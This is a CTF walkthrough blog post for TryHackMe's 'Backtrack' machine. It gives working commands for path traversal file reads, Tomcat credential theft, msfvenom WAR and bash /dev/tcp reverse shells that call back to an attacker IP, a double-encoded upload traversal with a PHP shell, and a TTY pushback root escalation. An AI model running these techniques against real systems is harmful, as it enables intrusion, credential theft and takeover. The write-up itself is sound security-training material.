---
title: "Backtrack CTF machine on THM"
classes: wide
header:  
  teaser: /assets/images/posts/writeups/backtrack.jpg
  #overlay_image: /assets/images/main/header3.jpg
  overlay_filter: 0.5
ribbon: Firebrick
excerpt: "Backtrack CTF offers an exciting medium-level challenge designed to keep you on your toes with a variety of obstacles. From the very start, you’ll dive into a path traversal exploit based on a known CVE, which sets the stage for a thrilling journey through a maze of vulnerabilities. As you navigate through each layer, you’ll encounter both connected and unexpected vulnerabilities, leading to many twists and turns. With plenty of rabbit holes to explore, Backtrack CTF is a true test of persistence and skill—perfect for anyone ready to hone their abilities and enjoy the thrill of the hunt!"
description: "Walkthrough on Backtrack CTF machine from TryHackMe"
categories:
  - writeups
tags:
  - path traversal
  - PHP
  - CVE
  - privesc
  - curl
  - tomcat
  - RCE
  - writeup
  - TryHackMe
  - Easy
toc: false
---

<img src="/assets/images/posts/writeups/backtrack.jpg" alt="Backtrack" width="500" class="align-center">

Backtrack CTF offers an exciting medium-level challenge designed to keep you on your toes with a variety of obstacles. From the very start, you’ll dive into a path traversal exploit based on a known CVE, which sets the stage for a thrilling journey through a maze of vulnerabilities. As you navigate through each layer, you’ll encounter both connected and unexpected vulnerabilities, leading to many twists and turns. With plenty of rabbit holes to explore, Backtrack CTF is a true test of persistence and skill—perfect for anyone ready to hone their abilities and enjoy the thrill of the hunt!!

## Information gathering

### Scanning

#### nmap

Command:
```sh
nmap -sC -sV 10.10.191.125 
```

Results:
```sh
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 55:41:5a:65:e3:d8:c2:4f:59:a1:68:b6:79:8a:e3:fb (RSA)
|   256 79:8a:12:64:cc:5c:d2:b7:38:dd:4f:07:76:4f:92:e2 (ECDSA)
|_  256 ce:e2:28:01:5f:0f:6a:77:df:1e:0a:79:df:9a:54:47 (ED25519)
8080/tcp open  http            Apache Tomcat 8.5.93
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.93
8888/tcp open  sun-answerbook?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 O
```

#### nuclei

Command:
```sh
nuclei -target 10.10.191.125:8888
```

Results:
```sh
[CVE-2021-43831] [http] [high] http://10.10.191.125:8888/file/../../../../../../../../../../../../../../../../../../etc/passwd [path="/etc/passwd"]
[CVE-2023-39141] [http] [high] http://10.10.191.125:8888/../../../../etc/passwd
[generic-linux-lfi] [http] [high] http://10.10.191.125:8888/./../../../../../../../../../../etc/passwd [paths="/./../../../../../../../../../../etc/passwd"]
[bullwark-momentum-lfi] [http] [high] http://10.10.191.125:8888/../../../../../../../../../../../../../etc/passwd
[gsoap-lfi] [http] [high] http://10.10.191.125:8888/../../../../../../../../../etc/passwd
[jinfornet-jreport-lfi] [http] [high] http://10.10.191.125:8888/jreport/sendfile/help/../../../../../../../../../../../../../../etc/passwd
[CVE-2017-14849] [http] [high] http://10.10.191.125:8888/static/../../../a/../../../../etc/passwd
[http-missing-security-headers:permissions-policy] [http] [info] http://10.10.191.125:8888
[http-missing-security-headers:referrer-policy] [http] [info] http://10.10.191.125:8888
[http-missing-security-headers:clear-site-data] [http] [info] http://10.10.191.125:8888
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://10.10.191.125:8888
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://10.10.191.125:8888
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://10.10.191.125:8888
[http-missing-security-headers:strict-transport-security] [http] [info] http://10.10.191.125:8888
[http-missing-security-headers:x-frame-options] [http] [info] http://10.10.191.125:8888
[http-missing-security-headers:x-content-type-options] [http] [info] http://10.10.191.125:8888
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://10.10.191.125:8888
[http-missing-security-headers:content-security-policy] [http] [info] http://10.10.191.125:8888
[CVE-2015-3337] [http] [medium] http://10.10.191.125:8888/_plugin/head/../../../../../../../../../../../../../../../../etc/passwd
[CVE-2021-43495] [http] [high] http://10.10.191.125:8888/asd/../../../../../../../../etc/passwd
[CVE-2019-7315] [http] [high] http://10.10.191.125:8888/../../../../../etc/passwd
[CVE-2018-6184] [http] [high] http://10.10.191.125:8888/_next/../../../../../../../../../etc/passwd
[CVE-2017-16877] [http] [high] http://10.10.191.125:8888/_next/../../../../../../../../../../etc/passwd
[magicflow-lfi] [http] [high] http://10.10.191.125:8888/msa/../../../../../../../../etc/passwd
[CVE-2019-18922] [http] [high] http://10.10.191.125:8888/../../../../../../etc/passwd
[form-detection] [http] [info] http://10.10.191.125:8888
[opencti-lfi] [http] [high] http://10.10.191.125:8888/static/css//../../../../../../../../etc/passwd
[CVE-2010-4231] [http] [high] http://10.10.191.125:8888/../../../../../../../../../../../../../etc/passwd
[tech-detect:google-font-api] [http] [info] http://10.10.191.125:8888
[tech-detect:angular] [http] [info] http://10.10.191.125:8888
[CVE-2022-38794] [http] [high] http://10.10.191.125:8888/../../../../../../../../etc/passwd
[ibm-infoprint-lfi] [http] [high] http://10.10.191.125:8888/./../../../../../../../../../../etc/passwd
[CVE-2018-3714] [http] [medium] http://10.10.191.125:8888/node_modules/../../../../../etc/passwd
[nginx-merge-slashes-path-traversal] [http] [high] http://10.10.191.125:8888///////../../../etc/passwd
[CVE-2019-11510] [http] [critical] http://10.10.191.125:8888/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/
[CVE-2021-43496] [http] [high] http://10.10.191.125:8888/img/../../../../../../etc/passwd
[exposed-file-upload-form] [http] [info] http://10.10.191.125:8888

```
#### ffuf

Command:
```sh
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.191.125:8888/FUZZ
```

Results:
```sh
flags                   [Status: 500, Size: 82, Words: 9, Lines: 2, Duration: 183ms]
```

## Exploitation

### Foothold
1. After the recon phase we discovered we have Aria2 WebUI running on port 8888
2. As per nuclei scan there are a couple of path traversal vulnerabilities one in particular marked as high CVE-2023-39141
3. Searching for Aria2 and the CVE we can see the app is vulnerable, more about this here https://gist.github.com/JafarAkhondali/528fe6c548b78f454911fb866b23f66e
4. To check the vulnerability we can run curl on /etc/passwd location:

```sh
curl --path-as-is http://10.10.191.125:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:112:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:122:MySQL Server,,,:/nonexistent:/bin/false
tomcat:x:1002:1002::/opt/tomcat:/bin/false
orville:x:1003:1003::/home/orville:/bin/bash
wilbur:x:1004:1004::/home/wilbur:/bin/bash
```
5. Now that we are able to read random files on the system I was trying to search for interesting stuff based on /etc/passwd file:
6. Tryied to read mysql config as we have a mysql user:
```sh
curl --path-as-is http://10.10.191.125:8888/../../../../../../../../../../../../../../../../../../../../etc/mysql/my.cnf
#
# The MySQL database server configuration file.
#
# You can copy this to one of:
# - "/etc/mysql/my.cnf" to set global options,
# - "~/.my.cnf" to set user-specific options.
# 
# One can use all long options that the program supports.
# Run program with --help to get a list of available options and with
# --print-defaults to see which it would actually understand and use.
#
# For explanations see
# http://dev.mysql.com/doc/mysql/en/server-system-variables.html

#
# * IMPORTANT: Additional settings that can override those from this file!
#   The files must end with '.cnf', otherwise they'll be ignored.
#

!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/
```
7. Tried to read random flag.txt files inside both home locations for user *orville* and *wilbur* with no luck
8. Finally tried to read user config file for Tomcat using default location:
```sh
curl --path-as-is http://10.10.191.125:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">

  <role rolename="manager-script"/>
  <user username="tomcat" password="OPx52k53D8OkTZpx4fr" roles="manager-script"/>

</tomcat-users>
```
9. Since I'm not proficient with Tomcat config, first I tried to login from browser with the discovered user and password on `http://10.10.1.70:8080` but I run into an error like 'By default the Host Manager is only accessible from a browser running on the same machine as Tomcat...'
10. Digging deeper I found there are different roles in Tomcat and the one assigned to user I found is `manager-script`. This role can't access `/host-manager/html` from GUI, only via text-web-service (more on the topic here: https://www.baeldung.com/tomcat-manager-app)
11. For the beginning let's list all deployed apps:
```sh
curl -u tomcat:OPx52k53D8OkTZpx4fr http://10.10.1.70:8080/manager/text/list
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:examples
/reverse_shell:running:0:reverse_shell
/host-manager:running:0:host-manager
/manager:running:0:manager
/docs:running:0:docs
```
12. Next step will be to try establish a reverse shell
13. For that we will manually generate a .war (Web Application Archive) file using a tool like `msfvenom` :
```sh
msfvenom -p java/jsp_shell_reverse_tcp lhost=10.11.79.193 lport=4455 -f war > shell.war
```
14. Upload the file from text-web-interface as described in the link above:
```sh
curl --upload-file shell.war -u tomcat:OPx52k53D8OkTZpx4fr "http://10.10.1.70:8080/manager/text/deploy?path=/shell"
```
15. Start a local listener `nc -lvnp 4455` and access the revshell from browser `http://10.10.1.70:8080/shell/`
16. NOTE using Metasploit with `tomcat_mgr_upload` exploit will not work as that exploit targets users with GUI access
17. To make our job easier we will stabiles the shell
```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
#CTRL+Z
stty raw -echo; fg
```
#### Data exfiltration
1. Let's hunt for the first flag and the place to search is the `tomcat` user home
2. As per `/etc/passwd` the home for this user is `/opt/tomcat`
3. Here you can read the content of `flag1.txt` and get the flag: **[FLAG1]**

### Privilege escalation
1. To continue I run `sudo -l` and found:
```sh
Matching Defaults entries for tomcat on Backtrack:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tomcat may run the following commands on Backtrack:
    (wilbur) NOPASSWD: /usr/bin/ansible-playbook /opt/test_playbooks/*.yml
```
5. I checked the the `/opt/test_playbooks/` directory and I saw is owned by `wilbur` user and `tomcat` has no access to write in it
6. Trying to privesc I lost a lot of time to move the `linpeas.sh` script and hunt for "ghosts" (truth being told I did this machine on the Halloween day)
7. Trying to lateral move from `tomcat` to `wilbur` I return to my initial finding, the `ansible` scrip, and start building a plan
8. First I'll need to create my `shell.yml` script to start a reverse shell and start a listener locally (read more about ansible script exploit here https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/)
```sh
- hosts: localhost
  tasks:
  - name: rev
    shell: bash -c 'bash -i >& /dev/tcp/10.11.79.193/4444 0>&1'
```
9. Now I have to find a way to give my script as a parameter!!!
10. After a lot of attempts I found that the script can be fooled using the name of the CTF `../`, and I managed to run it by placing my `.yml` file in the `/tmp` folder and run it like:
```sh
sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/shell.yml
```
11. A new reverse shell was created and now I have access as `wilbur`
12. Looking around I found two interesting files in the user `/home` directory
```sh
#from_orville.txt 
Hey Wilbur, it\'s Orville. I just finished developing the image gallery web app I told you about last week, and it works just fine. However, I\'d like you to test it yourself to see if everything works and secure.
I\'ve started the app locally so you can access it from here. I\'ve disabled registrations for now because it\'s still in the testing phase. Here are the credentials you can use to log in:

email : orville@backtrack.thm
password : W34r3B3773r73nP3x3l$

#.just_in_case.txt (hidden file)
in case i forget :

wilbur:mYe317Tb9qTNrWFND7KF
```
13. Looks like `wilbur` password is working for SSH login
14. Reading the message about the application under test, I was curious to see what other ports are exposed locally and I run a `netstat`
```sh
netstat -lntu
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:6800            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp6       0      0 :::8888                 :::*                    LISTEN     
tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN     
tcp6       0      0 :::8080                 :::*                    LISTEN     
tcp6       0      0 :::6800                 :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
udp        0      0 127.0.0.53:53           0.0.0.0:*                          
udp        0      0 10.10.225.249:68        0.0.0.0:* 
```
15. The first port I checked locally was 80 and indeed is running some app related to image gallery
```sh
curl http://127.0.0.1:80

...
Welcome to my image gallery
Login and start uploading images!
...
```
16. In order to test the application we need to forward `localhost:80` to a port bound to the external IP
17. For this I tried to use SSH `ssh -f -N -R 0.0.0.0:5588:localhost:80 wilbur@10.10.254.205` but after some exploration I found it does not allow remote port forwarding to bind to non-localhost addresses for security reasons
18. Next I moved to NetCat as is already installed on the machine. With it I was a bit luckier meaning I was able to make one request at a time before timeout
```sh
mkfifo /tmp/pipe_in /tmp/pipe_out
cat /tmp/pipe_in | nc -l -p 7733 | tee /tmp/pipe_out &bg
cat /tmp/pipe_out | nc localhost 80 > /tmp/pipe_in &bg
```
19. Tired an frustrated I moved to ChatGPT (model o1-preview) and used the prompt:
```sh
I have a web application running on localhost port 80 and I need to forward the traffic to the same machine\'s public IP 10.10.254.205 port 7733 so I can access the web app from the internet. Please provide me a simple solution. Keep in mind that mi user wilbur has limited access on the Ubuntu machine and is not allowed to use sudo. The only external tool I have installed is netcat.
```
20. In no time he provided me the solution in the form of a simple TCP Proxy as a Python script:
```python
#!/usr/bin/env python3

import socket
import threading

def handle_client(client_socket):
    remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    remote_socket.connect(('localhost', 80))

    # Start two threads to handle bidirectional data transfer
    threading.Thread(target=forward, args=(client_socket, remote_socket)).start()
    threading.Thread(target=forward, args=(remote_socket, client_socket)).start()

def forward(source, destination):
    try:
        while True:
            data = source.recv(4096)
            if not data:
                break
            destination.sendall(data)
    except:
        pass
    finally:
        source.close()
        destination.close()

def main():
    listen_addr = '0.0.0.0'
    listen_port = 7733

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((listen_addr, listen_port))
    server.listen(5)
    print(f'[*] Listening on {listen_addr}:{listen_port}')

    while True:
        client_socket, addr = server.accept()
        print(f'[*] Accepted connection from {addr[0]}:{addr[1]}')
        threading.Thread(target=handle_client, args=(client_socket,)).start()

if __name__ == '__main__':
    main()
```
21. Running the script on the machine allowed me to access the internal app forwarded on port 7733 `http://10.10.254.205:7733`
22. We the application accessible we can login with credentials discovered in the file `from_orville.txt` exfiltrated earlier
23. The application allows you to upload an image file on the `/uploads` folder. To bypass the file type is as simple as naming the payload `payload.jpg.php` but the problem is that files uploaded in this folder can't be executed server-side due to server configuration settings designed to enhance security by preventing code execution in certain directories (we know this because the file is downloaded instead run when you try to access it)
24. The next step will be to find a way to upload a file named `../payload.jpg.php` and hope the script will simply concatenate the file path with file name resulting in something like `/uploads/../payload.jpg.php` this way we can simply run the file outside restricted directory like `http://10.10.191.31:7733/payload.jpg.php`
25. The problem is that the application is removing special characters like`./` and we need to find a way to encode it to pass the filters
26. After a couple of attempts I have double URL encoded the character and it worked. Basically I have encoded `../xcat.jpg.php` to `%252e%252e%252fxcat.jpg.php` and I have replaced the file content with a simple PHP
```php
<?php
echo "PHP is working!";
?>
```
27. I checked the usual directory `/uploads` and I saw the file is not in there than I tried to see if it was uploaded one folder up by requesting `http://10.10.102.219:7733/xcat.jpg.php` and it worked
28. Now that we have a way to upload and run PHP files I have started a listener locally and uploaded a new file called `%252e%252e%252fptest.jpg.php` containing "PHP PentestMonkey" reverse shell and I run the file as before to spawn a shell as `orville` user
#### Data exfiltration
1. In the user home directory there is a file called `flag2.txt` containing the second flag: **[FLAG2]**
2. In the `orville` home directory there is an archive you can open with `unzip web_snapshot.zip`
3. The archive contains a data base configuration file `var/www/html/includes/db.php` containing user name and password to connect to MySQL
```sh
$host = 'localhost';
$dbname = 'backtrack';
$username = 'orville';
$password = '3uK32VD7YRtVHsrehoA3';
```
4. With the above credentials you can connect to the data base and look for interesting stuff (like other users credentials):
```sh
# Connect to the data base
mysql -h localhost -u orville -p #add password when prompted

# List available DBs
show databases;

# Check mysql DB
use mysql;

# List mysql DB tables
show tables;

# Select available users and info
select * from user;
```
5. Using listed commands I was able to discover a user `root` with a `mysql_native_password` like `*856799D829FB98D3A55E56F888675465A2C973E4`
6. After a lot of time spent on this rabbit hole I decided to check other options as cracking the password for root and trying to change password with limited privileges `orville` user had on `mysql` DB, was impossible
7. The next rabbit hole I spent time was related to archive previously discovered `/home/orville/web_snapshot.zip`; this file is created every minute by some script/cron/app and I lost a lot of time trying to exploit that
8. Finally seems everting boils down to some old vulnerability described here https://www.errno.fr/TTYPushback.html called TTY Pushback (with a CTFish twist)
9. Basically while running the `su` command, the `root` user does not use the `-P` flag, meaning no new `PTY` is allocated 
10. User `orville` can abuse it by sending a `SIGSTOP` signal to it, allowing focus to shift to the `root` shell
11. On the link above you can find the POC as a Python script you can use to crate a file called `ttyPush.py` in `orville` home directory
```python
#!/usr/bin/env python3
import fcntl
import termios
import os
import sys
import signal

os.kill(os.getppid(), signal.SIGSTOP)

for char in 'chmod +s /bin/bash\n':
    fcntl.ioctl(0, termios.TIOCSTI, char)
```
12. Next we add the script to `.bashrc` so it can be executed by `root`
```sh
echo "python3 /home/orville/ttyPush.py 'chmod +s /usr/bin/bash'" >> .bashrc
```
13. Finally we can run `bash -p` and gain root access  so we can retrieve the `flag3.txt` from `/root`: **[FLAG3]**
